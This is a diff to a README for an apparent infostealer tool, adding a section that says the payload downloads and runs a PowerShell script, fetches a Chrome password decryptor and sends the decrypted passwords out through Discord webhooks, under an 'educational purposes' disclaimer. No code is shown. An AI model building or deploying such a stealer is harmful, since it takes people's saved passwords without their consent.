@@ -1,6 +1,10 @@
 THIS SCRIPT IS ONLY INTENDED FOR EDUCATIONAL PURPOSES
 (decrypt script made by ohyicong)
 
+# What it does
+
+This payload downloads and executes a powershell script that downloads a python chrome password decryptor, and then sends the decrypted passwords over discord using webhooks.
+
 # Dependencies:
 - Windows
 - Python
